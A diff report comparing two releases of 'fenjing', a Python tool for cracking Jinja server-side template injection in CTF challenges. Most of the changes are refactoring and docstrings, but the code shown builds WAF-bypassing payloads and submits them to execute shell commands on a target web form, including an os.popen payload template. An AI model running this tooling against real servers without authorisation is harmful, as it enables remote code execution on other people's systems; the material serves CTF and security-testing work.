# Comparing `tmp/fenjing-0.5.1.tar.gz` & `tmp/fenjing-0.5.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.5.1.tar", last modified: Wed Jul 26 19:52:14 2023, max compression
+gzip compressed data, was "fenjing-0.5.2.tar", last modified: Mon Jul 31 12:23:17 2023, max compression
```

## Comparing `fenjing-0.5.1.tar` & `fenjing-0.5.2.tar`

### file list

```diff
@@ -1,39 +1,39 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:52:14.822969 fenjing-0.5.1/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-26 19:52:04.000000 fenjing-0.5.1/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-26 19:52:04.000000 fenjing-0.5.1/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-26 19:52:14.822969 fenjing-0.5.1/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     9413 2023-07-26 19:52:04.000000 fenjing-0.5.1/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-26 19:52:04.000000 fenjing-0.5.1/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:52:14.818969 fenjing-0.5.1/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)    15053 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     2324 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3434 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     5562 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/form.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    37414 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2206 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/shell_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     6226 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/submitter.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:52:14.822969 fenjing-0.5.1/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-26 19:52:04.000000 fenjing-0.5.1/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:52:14.818969 fenjing-0.5.1/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-26 19:52:14.000000 fenjing-0.5.1/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-26 19:52:14.000000 fenjing-0.5.1/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-26 19:52:14.000000 fenjing-0.5.1/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 19:52:14.000000 fenjing-0.5.1/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-26 19:52:14.000000 fenjing-0.5.1/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 19:52:04.000000 fenjing-0.5.1/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-26 19:52:14.822969 fenjing-0.5.1/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-26 19:52:04.000000 fenjing-0.5.1/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:52:14.822969 fenjing-0.5.1/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     2083 2023-07-26 19:52:04.000000 fenjing-0.5.1/tests/test_cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     5969 2023-07-26 19:52:04.000000 fenjing-0.5.1/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3827 2023-07-26 19:52:04.000000 fenjing-0.5.1/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-31 12:23:17.824095 fenjing-0.5.2/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-31 12:23:04.000000 fenjing-0.5.2/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-31 12:23:04.000000 fenjing-0.5.2/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-31 12:23:17.824095 fenjing-0.5.2/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     9413 2023-07-31 12:23:04.000000 fenjing-0.5.2/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-31 12:23:04.000000 fenjing-0.5.2/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-31 12:23:17.824095 fenjing-0.5.2/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)    15737 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1219 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      920 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2324 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3434 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6935 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/form.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7619 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    46622 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2159 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1778 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1039 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     7193 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/submitter.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-31 12:23:17.824095 fenjing-0.5.2/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     5977 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10187 2023-07-31 12:23:04.000000 fenjing-0.5.2/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-31 12:23:17.824095 fenjing-0.5.2/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-31 12:23:17.000000 fenjing-0.5.2/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-31 12:23:17.000000 fenjing-0.5.2/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-31 12:23:17.000000 fenjing-0.5.2/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-31 12:23:17.000000 fenjing-0.5.2/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-31 12:23:17.000000 fenjing-0.5.2/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-31 12:23:04.000000 fenjing-0.5.2/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-31 12:23:17.824095 fenjing-0.5.2/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-31 12:23:04.000000 fenjing-0.5.2/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-31 12:23:17.824095 fenjing-0.5.2/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     6889 2023-07-31 12:23:04.000000 fenjing-0.5.2/tests/test_cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5969 2023-07-31 12:23:04.000000 fenjing-0.5.2/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3827 2023-07-31 12:23:04.000000 fenjing-0.5.2/tests/test_payload_gen.py
```

### Comparing `fenjing-0.5.1/LICENSE` & `fenjing-0.5.2/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/PKG-INFO` & `fenjing-0.5.2/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.5.1
+Version: 0.5.2
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.5.1/README.md` & `fenjing-0.5.2/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/fenjing/cli.py` & `fenjing-0.5.2/fenjing/cli.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,36 +1,35 @@
 """命令行界面的入口
 
 """
-
 import logging
+
 from urllib.parse import urlparse
 from typing import Callable, List, Dict
 from functools import partial
 
 import click
 
-from fenjing.payload_gen import generate
-
-
-from .form import get_form
-from .cracker import Cracker
-from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
-from .full_payload_gen import FullPayloadGen
-from .scan_url import yield_form
-from .requester import Requester
 from .const import (
     OS_POPEN_READ,
     DEFAULT_USER_AGENT,
     CONFIG,
     DETECT_MODE_ACCURATE,
 )
-from .colorize import colored
+from .colorize import colored, set_enable_coloring
+from .cracker import Cracker
+from .form import get_form
+from .full_payload_gen import FullPayloadGen
+from .requester import Requester
+from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
+from .scan_url import yield_form
 from .webui import main as webui_main
 
+set_enable_coloring()
+
 TITLE = colored(
     "yellow",
     r"""
     ____             _ _
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
  / __/  __/ / / / / / / / / / /_/ /
@@ -40,15 +39,14 @@
     ------Made with passion by Marven11
 """.strip(
         "\n"
     ),
     bold=True,
 )
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
-
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
 
 
 def cmd_exec_submitter(
     cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
 ) -> str:
@@ -72,26 +70,36 @@
             "Payload generator says that this payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
     assert result is not None
     return result.text
 
+
 def cmd_exec_generate_func(
     cmd: str, submitter: Submitter, generate_func: Callable, will_print: bool
 ) -> str:
+    """使用submitter和generate_func函数生成并提交cmd对应的payload
+
+    Args:
+        cmd (str): payload对应的shell command
+        submitter (Submitter): 实际发送HTTP请求，提交payload的实例
+        generate_func (Callable): 接受一个string, 生成对应payload的函数
+        will_print (bool): payload是否会生成回显
+
+    Returns:
+        str: 提交结果
+    """
     payload = generate_func(cmd)
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
-        payload_wont_print = (
-            "This payload %s command execution result."
-        )
+        payload_wont_print = "This payload %s command execution result."
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
     assert result is not None
     return result.text
 
 
 def interact(cmd_exec_func: Callable):
@@ -109,25 +117,34 @@
         except KeyboardInterrupt:
             break
         result = cmd_exec_func(cmd)
         print(result)
 
 
 def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
+    """将headers列表和cookie字符串解析为可以传给requests的字典
+
+    Args:
+        headers_list (List[str]): headers列表，元素的格式为'Key: value'
+        cookies (str): Cookie字符串
+
+    Returns:
+        Dict[str, str]: Headers字典
+    """
     headers = {}
     if headers_list:
         for header in headers_list:
-            k, _, v = header.partition(": ")
-            if not k or not v:
-                logger.warning(f"Failed parsing {repr(header)}, ignored.")
+            key, _, value = header.partition(": ")
+            if not key or not value:
+                logger.warning("Failed parsing %s, ignored.", repr(header))
                 continue
-            if k.capitalize() != k:
-                logger.warning(f"Header {k} is not capitalized, fixed.")
-                k = k.capitalize()
-            headers[k] = v
+            if key.capitalize() != key:
+                logger.warning("Header %s is not capitalized, fixed.", key)
+                key = key.capitalize()
+            headers[key] = value
     if cookies:
         headers["Cookie"] = cookies
     return headers
 
 
 @click.group()
 def main():
@@ -221,15 +238,18 @@
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
 @click.option(
-    "--eval-args-payload", default=False, is_flag=True, help="[试验性]是否在GET参数中传递Eval payload"
+    "--eval-args-payload",
+    default=False,
+    is_flag=True,
+    help="[试验性]是否在GET参数中传递Eval payload",
 )
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 @click.option("--proxy", default="", help="请求时使用的代理")
 @click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def crack(
@@ -284,21 +304,21 @@
             continue
         found = True
     if not found:
         logger.warning("Test form failed...")
         return
     assert submitter is not None and result is not None
     if eval_args_payload:
-        assert isinstance(result,tuple)
+        assert isinstance(result, tuple)
         full_payload_gen, submitter, will_print = result
         cmd_exec_func = partial(
             cmd_exec_generate_func,
-            submitter = submitter,
-            generate_func = lambda x: "__import__('os').popen({}).read()".format(repr(x)),
-            will_print = will_print
+            submitter=submitter,
+            generate_func=lambda x: f"__import__('os').popen({repr(x)}).read()",
+            will_print=will_print,
         )
     else:
         assert isinstance(result, FullPayloadGen)
         full_payload_gen = result
         cmd_exec_func = partial(
             cmd_exec_submitter,
             submitter=submitter,
```

### Comparing `fenjing-0.5.1/fenjing/colorize.py` & `fenjing-0.5.2/fenjing/colorize.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,28 +1,39 @@
 """给字符串加上ANSI转义符以在命令行中打印出颜色
 
 """
 
 import platform
 
-SHOULD_COLOR = platform.system() != "Windows"
+IS_SUPPORTED_PLATFORM = platform.system() != "Windows"
+IS_COLORING_ENABLED = False
+
+
+def set_enable_coloring(enable=True):
+    """打开或关闭默认关闭的字符串上色
+
+    Args:
+        enable (bool, optional): 设置是否开启. Defaults to True.
+    """
+    global IS_COLORING_ENABLED  # pylint: disable=W0603
+    IS_COLORING_ENABLED = enable
 
 
 def colored(color, text, bold=False):
     """使用ANSI转义字符对文本上色，在windows下不会上色
 
     Args:
         color (str): 使用的颜色
         text (str): 要上色的字符串
         bold (bool, optional): 是否加粗. Defaults to False.
 
     Returns:
         str: 上色后的字符串
     """
-    if not SHOULD_COLOR:
+    if not IS_SUPPORTED_PLATFORM or not IS_COLORING_ENABLED:
         return text
     colors = {
         "red": "31",
         "green": "32",
         "yellow": "33",
         "blue": "34",
         "purple": "35",
```

### Comparing `fenjing-0.5.1/fenjing/config_payload.py` & `fenjing-0.5.2/fenjing/config_payload.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,12 +1,13 @@
 """生成获取config的payload
 
 """
 
 from typing import Callable, Dict, Union
+
 from .const import CONFIG
 from .full_payload_gen import FullPayloadGen
 
 full_payload_store: Dict[int, FullPayloadGen] = {}
 
 
 def config_payload(
```

### Comparing `fenjing-0.5.1/fenjing/const.py` & `fenjing-0.5.2/fenjing/const.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/fenjing/context_vars.py` & `fenjing-0.5.2/fenjing/context_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/fenjing/cracker.py` & `fenjing-0.5.2/fenjing/cracker.py`

 * *Files 21% similar despite different names*

```diff
@@ -1,39 +1,40 @@
 """攻击指定的路径
 
 """
 
-from hashlib import new
 import logging
 import random
+
 from collections import namedtuple
 from string import ascii_lowercase
-from typing import Union, Callable, Dict
-
-from fenjing.form import random_fill
+from typing import Union, Callable, Dict, Tuple
 
+from .form import random_fill
 from .submitter import FormSubmitter, RequestSubmitter, Submitter
 from .colorize import colored
 from .const import (
     ATTRIBUTE,
     CHAINED_ATTRIBUTE_ITEM,
     EVAL,
     LITERAL,
     OS_POPEN_READ,
     DETECT_MODE_ACCURATE,
 )
 from .waf_func_gen import WafFuncGen
 from .full_payload_gen import FullPayloadGen
-from fenjing import submitter
 
 logger = logging.getLogger("cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
 
 class Cracker:
+    """
+    针对某个网站进行攻击
+    """
     test_cmd = "echo f3n  j1ng;"
     test_eval = "'f'+str(3)+'n j'+str(1)+\"ng\""
     test_result = "f3n j1ng"
 
     def __init__(
         self,
         submitter: Submitter,
@@ -60,39 +61,67 @@
         return self._callback
 
     @callback.setter
     def callback(self, callback):
         self._callback = callback
         self.waf_func_gen.callback = callback
 
-    def test_payload(self, payload: str):
+    def test_payload(self, payload: str) -> bool:
+        """测试某个执行shell指令的payload是否会产生回显
+
+        Args:
+            payload (str): 用于测试的payload
+
+        Returns:
+            bool: 是否产生回显
+        """
         logger.info(
             "Testing generated payload.",
         )
         result = self.subm.submit(payload)
         assert result is not None
         _, text = result
         return self.test_result in text
 
-    def test_payload_eval_args(self, payload: str, subm: Submitter):
+    def test_payload_eval_args(self, payload: str, subm: Submitter) -> bool:
+        """测试某个进行eval的payload是否会产生回显
+
+        Args:
+            payload (str): 用于测试的payload
+            subm (Submitter): 
+                用于提交payload的submitter, 可能和self中的submitter不同
+
+        Returns:
+            bool: 是否产生回显
+        """
         logger.info(
             "Testing generated payload as eval args.",
         )
         result = subm.submit(payload)
         assert result is not None
         _, text = result
         return self.test_result in text
 
-    def has_respond(self):
+    def has_respond(self) -> bool:
+        """测试对应的submitter是否会产生回显（显示我们提交的数据）
+
+        Returns:
+            bool: 是否产生回显
+        """
         content = "".join(random.choices(ascii_lowercase, k=6))
         resp = self.subm.submit(content)
         assert resp is not None
         return content in resp.text
 
-    def crack(self):
+    def crack(self) -> Union[FullPayloadGen, None]:
+        """开始进行攻击，生成一个执行shell命令的payload，测试并返回payload生成器
+
+        Returns:
+            Union[FullPayloadGen, None]: 生成器
+        """
         logger.info("Cracking...")
         waf_func = self.waf_func_gen.generate()
         full_payload_gen = FullPayloadGen(
             waf_func, callback=None, detect_mode=self.detect_mode
         )
         payload, will_print = full_payload_gen.generate(OS_POPEN_READ, self.test_cmd)
         if payload is None:
@@ -112,15 +141,22 @@
         else:
             logger.info(
                 "We WON'T SEE the execution result! "
                 + "You can try generating payloads anyway.",
             )
         return full_payload_gen
 
-    def crack_eval_args(self):
+    def crack_eval_args(self) -> Union[Tuple[FullPayloadGen, Submitter, bool], None]:
+        """开始进行攻击，生成一个会eval GET参数x中命令的payload, 将其放进一个新的submitter中并返回。
+        新的submitter会填充GET参数x、提交并返回结果。
+
+        Returns:
+            Union[Tuple[FullPayloadGen, Submitter, bool], None]: 
+                产生的payload生成器，提交器，以及是否会产生回显
+        """
         logger.info("Cracking with request GET args...")
         assert isinstance(
             self.subm, FormSubmitter
         ), "Currently onlu FormSubmitter is supported"
         waf_func = self.waf_func_gen.generate()
         full_payload_gen = FullPayloadGen(
             waf_func, callback=None, detect_mode=self.detect_mode
@@ -141,15 +177,17 @@
         payload_dict = {self.subm.target_field: payload}
         method = self.subm.form["method"]
         assert isinstance(method, str)
         new_subm = RequestSubmitter(
             url=self.subm.url,
             method=method,
             target_field=args_target_field,
-            params=random_fill(self.subm.form) | payload_dict if method == "GET" else {},
+            params=random_fill(self.subm.form) | payload_dict
+            if method == "GET"
+            else {},
             data=random_fill(self.subm.form) | payload_dict if method != "GET" else {},
             requester=self.subm.req,
         )
         if self.subm.tamperers:
             for tamperer in self.subm.tamperers:
                 new_subm.add_tamperer(tamperer)
         if will_print:
```

### Comparing `fenjing-0.5.1/fenjing/form.py` & `fenjing-0.5.2/fenjing/form.py`

 * *Ordering differences only*

 * *Files 1% similar despite different names*

```diff
@@ -1,16 +1,16 @@
 """与HTML表格相关的函数
 
 """
 import sys
-from urllib.parse import urlparse, urlunparse
 import random
 import logging
 import string
 from typing import Dict, List, Union, Iterable
+from urllib.parse import urlparse, urlunparse
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("utils.form")
 Form = Dict[
     str,
     Union[str, set],
```

### Comparing `fenjing-0.5.1/fenjing/full_payload_gen.py` & `fenjing-0.5.2/fenjing/full_payload_gen.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 """完整payload的生成器，生成包括双花括号在内的所有部分
 
 """
 
-from typing import Callable, Tuple, Union, Dict, Any
 import logging
+from typing import Callable, Tuple, Union, Dict, Any
 
 from . import payload_gen
 from .colorize import colored
 from .context_vars import (
     context_payloads_all,
     filter_by_used_context,
     filter_by_waf,
@@ -124,17 +124,15 @@
 
         Returns:
             bool: 是否生成成功，失败则无法生成payload。
         """
         if self.prepared:
             return True
 
-        self.context_payload = filter_by_waf(
-            self.context_payload, self.waf_func
-        )
+        self.context_payload = filter_by_waf(self.context_payload, self.waf_func)
 
         self.context = context_payloads_to_context(self.context_payload)
 
         self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
         if not self.outer_pattern:
             return False
         if self.will_print:
@@ -187,47 +185,41 @@
             raise RuntimeError("Please run .do_prepare() first")
         if check_waf and self.waf_func(payload):
             return False
         self.context_payload[payload] = context_vars
         self.context = context_payloads_to_context(self.context_payload)
         return True
 
-    def generate(
-        self, gen_type, *args
-    ) -> Tuple[Union[str, None], Union[bool, None]]:
+    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
         """根据要求生成payload
 
         Args:
             gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型
 
         Returns:
             Tuple[Union[str, None], Union[bool, None]]:
                 payload, 以及payload是否会有回显
         """
         if not self.prepared and not self.do_prepare():
             return None, None
 
-        assert (
-            self.payload_gen is not None
-        ), "when prepared, we should have payload_gen"
+        assert self.payload_gen is not None, "when prepared, we should have payload_gen"
 
         ret = self.payload_gen.generate_with_used_context(gen_type, *args)
 
         if ret is None:
             logger.warning("Bypassing WAF Failed.")
             return None, None
         inner_payload, used_context = ret
         context_payload = "".join(
             filter_by_used_context(self.context_payload, used_context).keys()
         )
         assert isinstance(self.outer_pattern, str)
 
-        payload = context_payload + self.outer_pattern.replace(
-            "PAYLOAD", inner_payload
-        )
+        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
 
         self.callback(
             CALLBACK_GENERATE_FULLPAYLOAD,
             {
                 "gen_type": gen_type,
                 "args": args,
                 "payload": payload,
```

### Comparing `fenjing-0.5.1/fenjing/payload_gen.py` & `fenjing-0.5.2/fenjing/payload_gen.py`

 * *Files 23% similar despite different names*

```diff
@@ -1,149 +1,304 @@
+"""
+生成和要求相符合的表达式，如('a'+'b')
+生成过程为接受一个生成目标（如`(STRING, 'ab')`），遍历对应的生成规则expression_gen，利用waf函数
+递归检查生成规则是否符合，并最终生成一个字符串形式的表达式
+expression_gen：所有表达式生成规则
+    接受一个生成目标，并返回一个生成目标的列表
+    比如说接收(STRING, 'ab')，返回[(LITERAL, '"a"'), (LITERAL, '"b"')]
+    也就是将一个生成目标“展开成”一系列生成目标
+PayloadGen：将用户提供的生成目标一层层展开，并使用WAF检测展开后是否可以通过WAF，然后
+    根据展开结果返回相应的表达式。
+"""
+
 # pylint: skip-file
 # flake8: noqa
-from collections import defaultdict
-from typing import Callable, DefaultDict, List, Dict, Union, Any, Tuple
+
 import re
 import time
 import logging
+import sys
+
+from collections import defaultdict
+from typing import (
+    Callable,
+    DefaultDict,
+    List,
+    Dict,
+    TypeVar,
+    Union,
+    Any,
+    Tuple,
+)
+
 from .colorize import colored
 from .const import *
 
 ContextVariable = Dict[str, Any]
-ReqGenRequirement = Tuple
 
-ReqGenRequirements = List[ReqGenRequirement]
-ReqGenReturn = ReqGenRequirements
-ReqGen = Callable[..., ReqGenReturn]
-ReqGenResult = Tuple[str, ContextVariable]
+if sys.version_info >= (3, 8):
+    from typing import Literal
+    LiteralTarget = Tuple[Literal["literal"], str]
+    UnsatisfiedTarget = Tuple[Literal["unsatisfied"],]
+    OneofTarget = Tuple[Literal["oneof"], List["Target"]]
+    WithContextVarTarget = Tuple[Literal["with_context_var"], str]
+    ZeroTarget = Tuple[Literal["zero"],]
+    PositiveIntegerTarget = Tuple[Literal["positive_integer"], int]
+    IntegerTarget = Tuple[Literal["integer"], int]
+    StringConcatTarget = Tuple[Literal["string_string_concat"],]
+    StringPercentTarget = Tuple[Literal["string_percent"],]
+    StringPercentLowerCTarget = Tuple[Literal["string_percent_lower_c"],]
+    StringUnderlineTarget = Tuple[Literal["string_underline"],]
+    StringLowerCTarget = Tuple[Literal["string_lower_c"],]
+    StringManyPercentLowerCTarget = Tuple[Literal["string_many_percent_lower_c"], int]
+    StringManyFormatCTarget = Tuple[Literal["string_many_format_c"], int]
+    CharTarget = Tuple[Literal["char"], str]
+    StringTarget = Tuple[Literal["string"], str]
+    FormularSumTarget = Tuple[Literal["formular_sum"], List[int]]
+    AttributeTarget = Tuple[Literal["attribute"], "Target", str]
+    ItemTarget = Tuple[Literal["item"], "Target", str]
+    ChassAttributeTarget = Tuple[Literal["class_attribute"], "Target", str]
+    ChainedAttriuteItemTarget = Tuple[Literal["chained_attribute_item"], ...]
+    ImportFuncTarget = Tuple[Literal["import_func"],]
+    EvalFuncTarget = Tuple[Literal["eval_func"],]
+    EvalTarget = Tuple[Literal["eval"], str]
+    ConfigTarget = Tuple[Literal["config"],]
+    ModuleOSTarget = Tuple[Literal["module_os"],]
+    OSPopenObj = Tuple[Literal["os_popen_obj"],]
+    OSPopenRead = Tuple[Literal["os_popen_read"],]
+    # Target = LiteralTarget
+    Target = Union[
+        LiteralTarget,
+        UnsatisfiedTarget,
+        OneofTarget,
+        WithContextVarTarget,
+        ZeroTarget,
+        PositiveIntegerTarget,
+        IntegerTarget,
+        StringConcatTarget,
+        StringPercentTarget,
+        StringPercentLowerCTarget,
+        StringUnderlineTarget,
+        StringLowerCTarget,
+        StringManyPercentLowerCTarget,
+        StringManyFormatCTarget,
+        CharTarget,
+        StringTarget,
+        FormularSumTarget,
+        AttributeTarget,
+        ItemTarget,
+        ChassAttributeTarget,
+        ChainedAttriuteItemTarget,
+        ImportFuncTarget,
+        EvalFuncTarget,
+        EvalTarget,
+        ConfigTarget,
+        ModuleOSTarget,
+        OSPopenObj,
+        OSPopenRead,
+    ]
+else:
+    LiteralTarget = Tuple
+    UnsatisfiedTarget = Tuple
+    OneofTarget = Tuple
+    WithContextVarTarget = Tuple
+    Target = Tuple
+
+
+ExpressionGeneratorReturn = TypeVar("ExpressionGeneratorReturn", bound=List[Target])
